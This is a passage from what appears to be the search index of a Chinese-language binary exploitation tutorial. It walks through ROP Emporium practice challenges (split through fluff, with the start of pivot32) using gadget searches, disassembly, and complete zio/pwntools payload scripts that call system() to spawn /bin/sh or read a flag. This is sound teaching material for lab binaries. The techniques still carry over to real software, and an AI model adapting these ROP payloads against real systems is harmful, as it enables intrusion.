\u4e4b\u7c7b\u7684\u6307\u4ee4\u5730\u5740\uff0c\u4ee5\u5e73\u8861\u5806\u6808\u3002\u4ece system() \u51fd\u6570\u4e2d\u4e5f\u80fd\u770b\u51fa\u6765\uff0c\u5b83\u73b0\u5c06 esp \u51cf\u53bb 0xc\uff0c\u518d\u53d6\u5730\u5740 esp+0x10 \u5904\u7684\u6307\u4ee4\uff0c\u4e5f\u5c31\u662f \"BBBB\" \u7684\u540e\u4e00\u4e2a\uff0c\u5373\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u56e0\u4e3a system() \u662f libc \u4e2d\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u79f0\u4f5c ret2libc\u3002","title":"split32"},{"location":"Tutorial/Material/Binary%20Exploitation/#split","text":"$ rabin2 -z split ... vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt \u5b57\u7b26\u4e32\u5730\u5740\u5728 0x00601060 \u3002 gdb-peda$ disassemble usefulFunction Dump of assembler code for function usefulFunction: 0x0000000000400807 <+0>: push rbp 0x0000000000400808 <+1>: mov rbp,rsp 0x000000000040080b <+4>: mov edi,0x4008ff 0x0000000000400810 <+9>: call 0x4005e0 <system@plt> 0x0000000000400815 <+14>: nop 0x0000000000400816 <+15>: pop rbp 0x0000000000400817 <+16>: ret End of assembler dump. 64 \u4f4d\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u901a\u8fc7 edi \u4f20\u9012\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u518d\u8c03\u7528\u4e00\u4e2a gadgets \u6765\u5c06\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5b58\u8fdb edi\u3002 \u6211\u4eec\u5148\u627e\u5230\u9700\u8981\u7684 gadgets\uff1a gdb-peda$ ropsearch \"pop rdi; ret\" Searching for ROP gadget: 'pop rdi; ret' in: binary ranges 0x00400883 : (b'5fc3') pop rdi; ret \u4e0b\u9762\u662f payload\uff1a $ python2 -c \"print 'A'*40 + '\\x83\\x08\\x40\\x00\\x00\\x00\\x00\\x00' + '\\x60\\x10\\x60\\x00\\x00\\x00\\x00\\x00' + '\\x10\\x08\\x40\\x00\\x00\\x00\\x00\\x00'\" | ./split ... > ROPE{a_placeholder_32byte_flag!} \u90a3\u6211\u4eec\u662f\u5426\u8fd8\u53ef\u4ee5\u7528\u524d\u9762\u90a3\u79cd\u65b9\u6cd5\u8c03\u7528 system() \u7684 plt \u5730\u5740 0x4005e0 \u5462\uff1a gdb-peda$ disassemble system Dump of assembler code for function system: 0x00007ffff7a63010 <+0>: test rdi,rdi 0x00007ffff7a63013 <+3>: je 0x7ffff7a63020 <system+16> 0x00007ffff7a63015 <+5>: jmp 0x7ffff7a62a70 <do_system> 0x00007ffff7a6301a <+10>: nop WORD PTR [rax+rax*1+0x0] 0x00007ffff7a63020 <+16>: lea rdi,[rip+0x138fd6] # 0x7ffff7b9bffd 0x00007ffff7a63027 <+23>: sub rsp,0x8 0x00007ffff7a6302b <+27>: call 0x7ffff7a62a70 <do_system> 0x00007ffff7a63030 <+32>: test eax,eax 0x00007ffff7a63032 <+34>: sete al 0x00007ffff7a63035 <+37>: add rsp,0x8 0x00007ffff7a63039 <+41>: movzx eax,al 0x00007ffff7a6303c <+44>: ret End of assembler dump. \u4f9d\u7136\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53c2\u6570\u7684\u4f20\u9012\u6ca1\u6709\u7528\u5230\u6808\uff0c\u6211\u4eec\u53ea\u9700\u628a\u5730\u5740\u76f4\u63a5\u66f4\u6539\u5c31\u53ef\u4ee5\u4e86\uff1a from zio import * payload = \"A\"*40 payload += l64(0x00400883) payload += l64(0x00601060) payload += l64(0x4005e0) io = zio('./split') io.writeline(payload) io.read()","title":"split"},{"location":"Tutorial/Material/Binary%20Exploitation/#callme32","text":"\u8fd9\u91cc\u6211\u4eec\u8981\u63a5\u89e6\u771f\u6b63\u7684 plt \u4e86\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0ccallme32 \u4ece\u5171\u4eab\u5e93 libcallme32.so \u4e2d\u5bfc\u5165\u4e09\u4e2a\u7279\u6b8a\u7684\u51fd\u6570\uff1a $ rabin2 -i callme32 | grep callme ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two \u6211\u4eec\u8981\u505a\u7684\u662f\u4f9d\u6b21\u8c03\u7528 callme_one() \u3001 callme_two() \u548c callme_three() \uff0c\u5e76\u4e14\u6bcf\u4e2a\u51fd\u6570\u90fd\u8981\u4f20\u5165\u53c2\u6570 1 \u3001 2 \u3001 3 \u3002\u901a\u8fc7\u8c03\u8bd5\u6211\u4eec\u80fd\u591f\u77e5\u9053\u51fd\u6570\u903b\u8f91\uff0c callme_one \u7528\u4e8e\u8bfb\u5165\u52a0\u5bc6\u540e\u7684 flag\uff0c\u7136\u540e\u4f9d\u6b21\u8c03\u7528 callme_two \u548c callme_three \u8fdb\u884c\u89e3\u5bc6\u3002 \u7531\u4e8e\u51fd\u6570\u53c2\u6570\u662f\u653e\u5728\u6808\u4e0a\u7684\uff0c\u4e3a\u4e86\u5e73\u8861\u5806\u6808\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a pop;pop;pop;ret \u7684 gadgets\uff1a $ objdump -d callme32 | grep -A 3 pop ... 80488a8: 5b pop %ebx 80488a9: 5e pop %esi 80488aa: 5f pop %edi 80488ab: 5d pop %ebp 80488ac: c3 ret 80488ad: 8d 76 00 lea 0x0(%esi),%esi ... \u6216\u8005\u662f add esp, 8; pop; ret \uff0c\u53cd\u6b63\u53ea\u8981\u80fd\u5e73\u8861\uff0c\u90fd\u53ef\u4ee5\uff1a gdb-peda$ ropsearch \"add esp, 8\" Searching for ROP gadget: 'add esp, 8' in: binary ranges 0x08048576 : (b'83c4085bc3') add esp,0x8; pop ebx; ret 0x080488c3 : (b'83c4085bc3') add esp,0x8; pop ebx; ret \u6784\u9020 payload \u5982\u4e0b\uff1a from zio import * payload = \"A\"*44 payload += l32(0x080485c0) payload += l32(0x080488a9) payload += l32(0x1) + l32(0x2) + l32(0x3) payload += l32(0x08048620) payload += l32(0x080488a9) payload += l32(0x1) + l32(0x2) + l32(0x3) payload += l32(0x080485b0) payload += l32(0x080488a9) payload += l32(0x1) + l32(0x2) + l32(0x3) io = zio('./callme32') io.writeline(payload) io.read()","title":"callme32"},{"location":"Tutorial/Material/Binary%20Exploitation/#callme","text":"64 \u4f4d\u7a0b\u5e8f\u4e0d\u9700\u8981\u5e73\u8861\u5806\u6808\u4e86\uff0c\u53ea\u8981\u5c06\u53c2\u6570\u6309\u987a\u5e8f\u4f9d\u6b21\u653e\u8fdb\u5bc4\u5b58\u5668\u4e2d\u5c31\u53ef\u4ee5\u4e86\u3002 $ rabin2 -i callme | grep callme ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two gdb-peda$ ropsearch \"pop rdi; pop rsi\" Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges 0x00401ab0 : (b'5f5e5ac3') pop rdi; pop rsi; pop rdx; ret payload \u5982\u4e0b\uff1a from zio import * payload = \"A\"*40 payload += l64(0x00401ab0) payload += l64(0x1) + l64(0x2) + l64(0x3) payload += l64(0x00401850) payload += l64(0x00401ab0) payload += l64(0x1) + l64(0x2) + l64(0x3) payload += l64(0x00401870) payload += l64(0x00401ab0) payload += l64(0x1) + l64(0x2) + l64(0x3) payload += l64(0x00401810) io = zio('./callme') io.writeline(payload) io.read()","title":"callme"},{"location":"Tutorial/Material/Binary%20Exploitation/#write432","text":"\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u5df2\u7ecf\u4e0d\u80fd\u5728\u7a0b\u5e8f\u4e2d\u627e\u5230\u53ef\u4ee5\u6267\u884c\u7684\u8bed\u53e5\u4e86\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5229\u7528 gadgets \u5c06 /bin/sh \u5199\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u4e2d\uff0c\u5982 .data \u6bb5\u4e2d\uff0c\u518d\u8c03\u7528 system() \u6267\u884c\u5b83\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002\u8981\u8ba4\u8bc6\u5230\u4e00\u4e2a\u91cd\u8981\u7684\u70b9\u662f\uff0cROP \u53ea\u662f\u4e00\u79cd\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f62\u5f0f\uff0c\u53ea\u8981\u6211\u4eec\u6709\u521b\u610f\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u6267\u884c\u8bf8\u5982\u5185\u5b58\u8bfb\u5199\u7b49\u64cd\u4f5c\u3002 \u8fd9\u79cd\u65b9\u6cd5\u867d\u7136\u597d\u7528\uff0c\u4f46\u8fd8\u662f\u8981\u8003\u8651\u6211\u4eec\u5199\u5165\u5730\u5740\u7684\u8bfb\u5199\u548c\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ca\u5b83\u80fd\u63d0\u4f9b\u7684\u7a7a\u95f4\u662f\u591a\u5c11\uff0c\u6211\u4eec\u5199\u5165\u7684\u5185\u5bb9\u662f\u5426\u4f1a\u5f71\u54cd\u5230\u7a0b\u5e8f\u6267\u884c\u7b49\u95ee\u9898\u3002\u5982\u6211\u4eec\u63a5\u4e0b\u6765\u60f3\u628a\u5b57\u7b26\u4e32\u5199\u5165 .data \u6bb5\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u5b83\u7684\u6743\u9650\u548c\u5927\u5c0f\u7b49\u4fe1\u606f\uff1a $ readelf -S write432 [Nr] Name Type Addr Off Size ES Flg Lk Inf Al ... [16] .rodata PROGBITS 080486f8 0006f8 000064 00 A 0 0 4 [25] .data PROGBITS 0804a028 001028 000008 00 WA 0 0 4 \u53ef\u4ee5\u770b\u5230 .data \u5177\u6709 WA \uff0c\u5373\u5199\u5165\uff08write\uff09\u548c\u5206\u914d\uff08alloc\uff09\u7684\u6743\u5229\uff0c\u800c .rodata \u5c31\u4e0d\u80fd\u5199\u5165\u3002 \u4f7f\u7528\u5de5\u5177 ropgadget \u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u627e\u5230\u6211\u4eec\u9700\u8981\u7684 gadgets\uff1a $ ropgadget --binary write432 --only \"mov|pop|ret\" ... 0x08048670 : mov dword ptr [edi], ebp ; ret 0x080486da : pop edi ; pop ebp ; ret \u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd9\u91cc\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u6bcf\u6b21\u53ea\u80fd\u5199\u5165 4 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8981\u5206\u6210\u4e24\u6b21\u5199\u5165\uff0c\u8fd8\u5f97\u6ce8\u610f\u5b57\u7b26\u5bf9\u9f50\uff0c\u6709\u6ca1\u6709\u622a\u65ad\u5b57\u7b26\uff08 \\x00 , \\x0a \u7b49\uff09\u4e4b\u7c7b\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u8fd9\u91cc /bin/sh \u53ea\u6709\u4e03\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 /bin/sh\\00 \u6216\u8005 /bin//sh \uff0c\u6784\u9020 payload \u5982\u4e0b\uff1a from zio import * pop_edi_ebp = 0x080486da mov_edi_ebp = 0x08048670 data_addr = 0x804a028 system_plt = 0x8048430 payload = \"\" payload += \"A\"*44 payload += l32(pop_edi_ebp) payload += l32(data_addr) payload += \"/bin\" payload += l32(mov_edi_ebp) payload += l32(pop_edi_ebp) payload += l32(data_addr+4) payload += \"/sh\\x00\" payload += l32(mov_edi_ebp) payload += l32(system_plt) payload += \"BBBB\" payload += l32(data_addr) io = zio('./write432') io.writeline(payload) io.interact() $ python2 run.py AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(/binp,/shp0BBBB(\ufffd write4 by ROP Emporium 32bits Go ahead and give me the string already! > cat flag.txt ROPE{a_placeholder_32byte_flag!}","title":"write432"},{"location":"Tutorial/Material/Binary%20Exploitation/#write4","text":"64 \u4f4d\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u4e00\u6b21\u6027\u5199\u5165\u4e86\u3002 $ ropgadget --binary write4 --only \"mov|pop|ret\" ... 0x0000000000400820 : mov qword ptr [r14], r15 ; ret 0x0000000000400890 : pop r14 ; pop r15 ; ret 0x0000000000400893 : pop rdi ; ret from pwn import * pop_r14_r15 = 0x0000000000400890 mov_r14_r15 = 0x0000000000400820 pop_rdi = 0x0000000000400893 data_addr = 0x0000000000601050 system_plt = 0x004005e0 payload = \"A\"*40 payload += p64(pop_r14_r15) payload += p64(data_addr) payload += \"/bin/sh\\x00\" payload += p64(mov_r14_r15) payload += p64(pop_rdi) payload += p64(data_addr) payload += p64(system_plt) io = process('./write4') io.recvuntil('>') io.sendline(payload) io.interactive()","title":"write4"},{"location":"Tutorial/Material/Binary%20Exploitation/#badchars32","text":"\u5728\u8fd9\u4e2a\u6311\u6218\u4e2d\uff0c\u6211\u4eec\u4f9d\u7136\u8981\u5c06 /bin/sh \u5199\u5165\u5230\u8fdb\u7a0b\u5185\u5b58\u4e2d\uff0c\u4f46\u8fd9\u4e00\u6b21\u7a0b\u5e8f\u5728\u8bfb\u53d6\u8f93\u5165\u65f6\u4f1a\u5bf9\u654f\u611f\u5b57\u7b26\u8fdb\u884c\u68c0\u67e5\uff0c\u67e5\u770b\u51fd\u6570 checkBadchars() \uff1a gdb-peda$ disassemble checkBadchars Dump of assembler code for function checkBadchars: 0x08048801 <+0>: push ebp 0x08048802 <+1>: mov ebp,esp 0x08048804 <+3>: sub esp,0x10 0x08048807 <+6>: mov BYTE PTR [ebp-0x10],0x62 0x0804880b <+10>: mov BYTE PTR [ebp-0xf],0x69 0x0804880f <+14>: mov BYTE PTR [ebp-0xe],0x63 0x08048813 <+18>: mov BYTE PTR [ebp-0xd],0x2f 0x08048817 <+22>: mov BYTE PTR [ebp-0xc],0x20 0x0804881b <+26>: mov BYTE PTR [ebp-0xb],0x66 0x0804881f <+30>: mov BYTE PTR [ebp-0xa],0x6e 0x08048823 <+34>: mov BYTE PTR [ebp-0x9],0x73 0x08048827 <+38>: mov DWORD PTR [ebp-0x4],0x0 0x0804882e <+45>: mov DWORD PTR [ebp-0x8],0x0 0x08048835 <+52>: mov DWORD PTR [ebp-0x4],0x0 0x0804883c <+59>: jmp 0x804887c <checkBadchars+123> 0x0804883e <+61>: mov DWORD PTR [ebp-0x8],0x0 0x08048845 <+68>: jmp 0x8048872 <checkBadchars+113> 0x08048847 <+70>: mov edx,DWORD PTR [ebp+0x8] 0x0804884a <+73>: mov eax,DWORD PTR [ebp-0x4] 0x0804884d <+76>: add eax,edx 0x0804884f <+78>: movzx edx,BYTE PTR [eax] 0x08048852 <+81>: lea ecx,[ebp-0x10] 0x08048855 <+84>: mov eax,DWORD PTR [ebp-0x8] 0x08048858 <+87>: add eax,ecx 0x0804885a <+89>: movzx eax,BYTE PTR [eax] 0x0804885d <+92>: cmp dl,al 0x0804885f <+94>: jne 0x804886e <checkBadchars+109> 0x08048861 <+96>: mov edx,DWORD PTR [ebp+0x8] 0x08048864 <+99>: mov eax,DWORD PTR [ebp-0x4] 0x08048867 <+102>: add eax,edx 0x08048869 <+104>: mov BYTE PTR [eax],0xeb 0x0804886c <+107>: jmp 0x8048878 <checkBadchars+119> 0x0804886e <+109>: add DWORD PTR [ebp-0x8],0x1 0x08048872 <+113>: cmp DWORD PTR [ebp-0x8],0x7 0x08048876 <+117>: jbe 0x8048847 <checkBadchars+70> 0x08048878 <+119>: add DWORD PTR [ebp-0x4],0x1 0x0804887c <+123>: mov eax,DWORD PTR [ebp-0x4] 0x0804887f <+126>: cmp eax,DWORD PTR [ebp+0xc] 0x08048882 <+129>: jb 0x804883e <checkBadchars+61> 0x08048884 <+131>: nop 0x08048885 <+132>: leave 0x08048886 <+133>: ret End of assembler dump. \u5f88\u660e\u663e\uff0c\u5730\u5740 0x08048807 \u5230 0x08048823 \u7684\u5b57\u7b26\u5c31\u662f\u6240\u8c13\u7684\u654f\u611f\u5b57\u7b26\u3002\u5904\u7406\u654f\u611f\u5b57\u7b26\u5728\u5229\u7528\u5f00\u53d1\u4e2d\u662f\u7ecf\u5e38\u8981\u7528\u5230\u7684\uff0c\u4e0d\u4ec5\u4ec5\u662f\u8981\u5bf9\u53c2\u6570\u8fdb\u884c\u7f16\u7801\uff0c\u6709\u65f6\u751a\u81f3\u5730\u5740\u4e5f\u8981\u5982\u6b64\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u7b80\u5355\u7684\u5f02\u6216\u64cd\u4f5c\u6765\u5bf9\u5b57\u7b26\u4e32\u7f16\u7801\u548c\u89e3\u7801\u3002 \u627e\u5230 gadgets\uff1a $ ropgadget --binary badchars32 --only \"mov|pop|ret|xor\" ... 0x08048893 : mov dword ptr [edi], esi ; ret 0x08048896 : pop ebx ; pop ecx ; ret 0x08048899 : pop esi ; pop edi ; ret 0x08048890 : xor byte ptr [ebx], cl ; ret \u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5c31\u662f\u5199\u5165\u524d\u7f16\u7801\uff0c\u4f7f\u7528\u524d\u89e3\u7801\uff0c\u4e0b\u9762\u662f payload\uff1a from zio import * xor_ebx_cl = 0x08048890 pop_ebx_ecx = 0x08048896 pop_esi_edi = 0x08048899 mov_edi_esi = 0x08048893 system_plt = 0x080484e0 data_addr = 0x0804a038 # encode badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73] xor_byte = 0x1 while(1): binsh = \"\" for i in \"/bin/sh\\x00\": c = ord(i) ^ xor_byte if c in badchars: xor_byte += 1 break else: binsh += chr(c) if len(binsh) == 8: break # write payload = \"A\"*44 payload += l32(pop_esi_edi) payload += binsh[:4] payload += l32(data_addr) payload += l32(mov_edi_esi) payload += l32(pop_esi_edi) payload += binsh[4:8] payload += l32(data_addr + 4) payload += l32(mov_edi_esi) # decode for i in range(len(binsh)): payload += l32(pop_ebx_ecx) payload += l32(data_addr + i) payload += l32(xor_byte) payload += l32(xor_ebx_cl) # run payload += l32(system_plt) payload += \"BBBB\" payload += l32(data_addr) io = zio('./badchars32') io.writeline(payload) io.interact()","title":"badchars32"},{"location":"Tutorial/Material/Binary%20Exploitation/#badchars","text":"64 \u4f4d\u7a0b\u5e8f\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u6ce8\u610f\u53c2\u6570\u4f20\u9012\u5c31\u597d\u4e86\u3002 $ ropgadget --binary badchars --only \"mov|pop|ret|xor\" ... 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret 0x0000000000400b3b : pop r12 ; pop r13 ; ret 0x0000000000400b40 : pop r14 ; pop r15 ; ret 0x0000000000400b30 : xor byte ptr [r15], r14b ; ret 0x0000000000400b39 : pop rdi ; ret from pwn import * pop_r12_r13 = 0x0000000000400b3b mov_r13_r12 = 0x0000000000400b34 pop_r14_r15 = 0x0000000000400b40 xor_r15_r14b = 0x0000000000400b30 pop_rdi = 0x0000000000400b39 system_plt = 0x00000000004006f0 data_addr = 0x0000000000601000 badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73] xor_byte = 0x1 while(1): binsh = \"\" for i in \"/bin/sh\\x00\": c = ord(i) ^ xor_byte if c in badchars: xor_byte += 1 break else: binsh += chr(c) if len(binsh) == 8: break payload = \"A\"*40 payload += p64(pop_r12_r13) payload += binsh payload += p64(data_addr) payload += p64(mov_r13_r12) for i in range(len(binsh)): payload += p64(pop_r14_r15) payload += p64(xor_byte) payload += p64(data_addr + i) payload += p64(xor_r15_r14b) payload += p64(pop_rdi) payload += p64(data_addr) payload += p64(system_plt) io = process('./badchars') io.recvuntil('>') io.sendline(payload) io.interactive()","title":"badchars"},{"location":"Tutorial/Material/Binary%20Exploitation/#fluff32","text":"\u8fd9\u4e2a\u7ec3\u4e60\u4e0e\u4e0a\u9762\u6ca1\u6709\u592a\u5927\u533a\u522b\uff0c\u96be\u70b9\u5728\u4e8e\u6211\u4eec\u80fd\u627e\u5230\u7684 gadgets \u4e0d\u662f\u90a3\u4e48\u76f4\u63a5\uff0c\u6709\u4e00\u4e2a\u6280\u5de7\u662f\u56e0\u4e3a\u6211\u4eec\u7684\u76ee\u7684\u662f\u5199\u5165\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u5fc5\u7136\u9700\u8981 mov [reg], reg \u8fd9\u6837\u7684 gadgets\uff0c\u6211\u4eec\u5c31\u4ece\u8fd9\u91cc\u51fa\u53d1\uff0c\u5012\u63a8\u6240\u9700\u7684 gadgets\u3002 $ ropgadget --binary fluff32 --only \"mov|pop|ret|xor|xchg\" ... 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret 0x080483e1 : pop ebx ; ret 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret \u6211\u4eec\u770b\u5230\u4e00\u4e2a\u8fd9\u6837\u7684 mov dword ptr [ecx], edx ; \uff0c\u53ef\u4ee5\u60f3\u5230\u6211\u4eec\u5c06\u5730\u5740\u653e\u8fdb ecx \uff0c\u5c06\u6570\u636e\u653e\u8fdb edx \uff0c\u4ece\u800c\u5c06\u6570\u636e\u5199\u5165\u5230\u5730\u5740\u4e2d\u3002payload \u5982\u4e0b\uff1a from zio import * system_plt = 0x08048430 data_addr = 0x0804a028 pop_ebx = 0x080483e1 mov_ecx_edx = 0x08048693 xchg_edx_ecx = 0x08048689 xor_edx_ebx = 0x0804867b xor_edx_edx = 0x08048671 def write_data(data, addr): # addr -> ecx payload = l32(xor_edx_edx) payload += \"BBBB\" payload += l32(pop_ebx) payload += l32(addr) payload += l32(xor_edx_ebx) payload += \"BBBB\" payload += l32(xchg_edx_ecx) payload += \"BBBB\" # data -> edx payload += l32(xor_edx_edx) payload += \"BBBB\" payload += l32(pop_ebx) payload += data payload += l32(xor_edx_ebx) payload += \"BBBB\" # edx -> [ecx] payload += l32(mov_ecx_edx) payload += \"BBBB\" payload += l32(0) return payload payload = \"A\"*44 payload += write_data(\"/bin\", data_addr) payload += write_data(\"/sh\\x00\", data_addr + 4) payload += l32(system_plt) payload += \"BBBB\" payload += l32(data_addr) io = zio('./fluff32') io.writeline(payload) io.interact()","title":"fluff32"},{"location":"Tutorial/Material/Binary%20Exploitation/#fluff","text":"\u63d0\u793a\uff1a\u5728\u4f7f\u7528 ropgadget \u641c\u7d22\u65f6\u52a0\u4e0a\u53c2\u6570 --depth \u53ef\u4ee5\u5f97\u5230\u66f4\u5927\u957f\u5ea6\u7684 gadgets\u3002 $ ropgadget --binary fluff --only \"mov|pop|ret|xor|xchg\" --depth 20 ... 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret 0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret from pwn import * system_plt = 0x004005e0 data_addr = 0x0000000000601050 xor_r11_r11 = 0x0000000000400822 xor_r11_r12 = 0x000000000040082f xchg_r11_r10 = 0x0000000000400840 mov_r10_r11 = 0x000000000040084c pop_r12 = 0x0000000000400832 def write_data(data, addr): # addr -> r10 payload = p64(xor_r11_r11) payload += \"BBBBBBBB\" payload += p64(pop_r12) payload += p64(addr) payload += p64(xor_r11_r12) payload += \"BBBBBBBB\" payload += p64(xchg_r11_r10) payload += \"BBBBBBBB\" # data -> r11 payload += p64(xor_r11_r11) payload += \"BBBBBBBB\" payload += p64(pop_r12) payload += data payload += p64(xor_r11_r12) payload += \"BBBBBBBB\" # r11 -> [r10] payload += p64(mov_r10_r11) payload += \"BBBBBBBB\"*2 payload += p64(0) return payload payload = \"A\"*40 payload += write_data(\"/bin/sh\\x00\", data_addr) payload += p64(system_plt) io = process('./fluff') io.recvuntil('>') io.sendline(payload) io.interactive()","title":"fluff"},{"location":"Tutorial/Material/Binary%20Exploitation/#pivot32","text":"\u8fd9\u662f\u6311\u6218\u7684\u6700\u540e\u4e00\u9898\uff0c\u96be\u5ea6\u7a81\u7136\u589e\u52a0\u3002\u9996\u5148\u662f\u52a8\u6001\u5e93\uff0c\u52a8\u6001\u5e93\u4e2d\u51fd\u6570\u7684\u76f8\u5bf9\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4e00\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u76f8\u5bf9\u4f4d\u7f6e\u5173\u7cfb\u5f97\u5230\u5176\u4ed6\u4efb\u610f\u51fd\u6570\u7684\u5730\u5740\u3002\u5728\u5f00\u542f ASLR \u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u5e93\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u5730\u5740\u662f\u53d8\u5316\u7684\uff0c\u4f46\u5e76\u4e0d\u5f71\u54cd\u5e93\u4e2d\u51fd\u6570\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u5148\u6cc4\u9732\u51fa\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5f97\u5230\u76ee\u6807\u51fd\u6570\u5730\u5740\u3002 \u901a\u8fc7\u5206\u6790\u6211\u4eec\u77e5\u9053\u8be5\u7a0b\u5e8f\u4ece\u52a8\u6001\u5e93 libpivot32.so \u4e2d\u5bfc\u5165\u4e86\u51fd\u6570 foothold_function() \uff0c\u4f46\u5728\u7a0b\u5e8f\u903b\u8f91\u4e2d\u5e76\u6ca1\u6709\u8c03\u7528\uff0c\u800c\u5728 libpivot32.so \u4e2d\u8fd8\u6709\u6211\u4eec\u9700\u8981\u7684\u51fd\u6570 ret2win() \u3002 \u73b0\u5728\u6211\u4eec\u77e5\u9053\u4e86\u53ef\u4ee5\u6cc4\u9732\u7684\u51fd\u6570 foothold_function() \uff0c\u90a3\u4e48\u600e\u4e48\u6cc4\u9732\u5462\u3002\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u7b80\u5355\u4ecb\u7ecd\u4e86\u5ef6\u65f6\u7ed1\u5b9a\u6280\u672f\uff0c\u5f53\u6211\u4eec\u5728\u8c03\u7528\u5982 func@plt() \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5c06\u771f\u6b63\u7684 func() \u51fd\u6570\u5730\u5740\u5199\u5165\u5230 GOT \u8868\u7684 func.got.plt \u4e2d\uff0c\u7136\u540e func@plt() \u6839\u636e func.got.plt \u8df3\u8f6c\u5230\u771f\u6b63\u7684 func() \u51fd\u6570\u4e0a\u53bb\u3002 \u6700\u540e\u662f\u8be5\u6311\u6218\u6700\u91cd\u8981\u7684\u90e8\u5206\uff0c\u7a0b\u5e8f\u8fd0\u884c\u6211\u4eec\u6709\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u5165\u88ab\u653e\u5728\u4e00\u4e2a\u7531 malloc() \u51fd\u6570\u5206\u914d\u7684\u5806\u4e0a\uff0c\u5f53\u7136\u4e3a\u4e86\u964d\u4f4e\u96be\u5ea6\uff0c\u7a0b\u5e8f\u7279\u5730\u5c06\u8be5\u5730\u5740\u6253\u5370\u4e86\u51fa\u6765\uff0c\u7b2c\u4e8c\u6b21\u7684\u8f93\u5165\u5219\u88ab\u653e\u5728\u4e00\u4e2a\u5927\u5c0f\u9650\u5236\u4e3a 13 \u5b57\u8282\u7684\u6808\u4e0a\uff0c\u8fd9\u4e2a\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u8ba9\u6211\u4eec\u6267\u884c\u5f88\u591a\u4e1c\u897f\uff0c\u6240\u4ee5\u9700\u8981\u8fd0\u7528 stack pivot\uff0c\u5373\u901a\u8fc7\u8986\u76d6\u8c03\u7528\u8005\u7684 ebp\uff0c\u5c06\u6808\u5e27\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u5730\u65b9\uff0c\u540c\u65f6\u63a7\u5236 eip\uff0c\u5373\u53ef\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\uff0c\u901a\u5e38\u7684 payload\uff08\u8fd9\u91cc\u79f0\u4e3a\u526fpayload\uff09 \u7ed3\u6784\u5982\u4e0b\uff1a buffer padding | fake ebp | leave;ret addr | \u8fd9\u6837\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5c31\u88ab\u8986\u76d6\u4e3a leave;ret 